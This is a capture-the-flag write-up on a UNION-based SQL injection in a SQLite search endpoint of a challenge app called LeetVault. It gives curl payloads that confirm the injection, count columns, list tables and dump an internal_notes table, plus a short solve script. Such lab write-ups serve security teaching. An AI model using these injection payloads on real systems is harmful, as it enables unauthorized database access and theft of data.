### Summary

The `/api/problems?search=` endpoint of LeetVault puts the `search` value directly into a SQLite `LIKE` clause, so the query can be extended with a `UNION SELECT`. The flag is not in any problem record. It is stored in the `internal_notes` table, which the search can read through the injection. Four requests are enough: confirm the injection, count columns, list the tables, and dump `internal_notes`.

### Steps

1. Confirm the injection. A lone single quote makes the search fail, while a quote that closes the string followed by a SQL comment returns every row.

   ```sh
   curl -s 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' -G --data-urlencode "search='"
   # {"error":"The legacy search service rejected that query."}
   curl -s 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' -G --data-urlencode "search=' -- -"
   # all 6 problems
   ```

   The commented version returns all rows, which shows that the `search` value is placed inside a string literal the attacker can close.

2. Find the column count and the database engine. The JSON result maps to four fields, `id`, `title`, `category` and `difficulty`, so the UNION has to select four columns. Only `title` is shown in the output, so the version string goes there.

   ```sh
   curl -s 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' -G \
     --data-urlencode "search=zzz' UNION SELECT 1,sqlite_version(),3,4-- -"
   # title: "3.46.1"
   ```

   The search term `zzz` matches no row, so only the injected row is shown.

3. List the tables from `sqlite_master`. `group_concat` packs all the names into the `title` field.

   ```sh
   curl -s 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' -G \
     --data-urlencode "search=zzz' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- -"
   # problems,categories,users,submissions,internal_notes
   ```

4. Dump `internal_notes`. The `content` column holds the verification note, and the flag is in one of its rows.

   ```sh
   curl -s 'https://isfcrpesu-hidden-test-case.chals.io/api/problems' -G \
     --data-urlencode "search=zzz' UNION SELECT 1,group_concat(content,' | '),3,4 FROM internal_notes-- -"
   # "Migration verification complete. Hidden test case: isfcr{REDACTED}" | ...
   ```

   The `solve.sh` script in the Scripts section performs this last step.

### Scripts

#### scripts/solve.sh

Sends the UNION payload that reads `internal_notes` and prints the result, which includes the flag. It takes an optional base URL and defaults to the challenge host. Run it as `./scripts/solve.sh [base_url]` from the `work` directory.

```bash
#!/usr/bin/env bash
# Recover the hidden flag from LeetVault via UNION-based SQLi on /api/problems?search=.
# Usage: ./solve.sh [base_url]   (default: the challenge host). Prints the flag line.
set -euo pipefail
base="${1:-https://isfcrpesu-hidden-test-case.chals.io}"
curl -s --max-time 25 "$base/api/problems" -G \
  --data-urlencode "search=zzz' UNION SELECT 1,group_concat(content,' | '),3,4 FROM internal_notes-- -"
echo
```

### Notes

- The "missing records" hint in the description points at hidden problems. The `problems` table has no rows with `is_public=0`, so there are no hidden problems to find. The flag is only in `internal_notes`.
- The `search` value is matched as `LIKE`, so `zzz` matches nothing and the injected row is the only output. Keep a non-matching prefix for that reason.
- The output has only four visible fields. Use `group_concat` to pack several rows into one field.
- The host is volatile. Pass the new base URL as the first argument to `solve.sh` if the default host has changed.
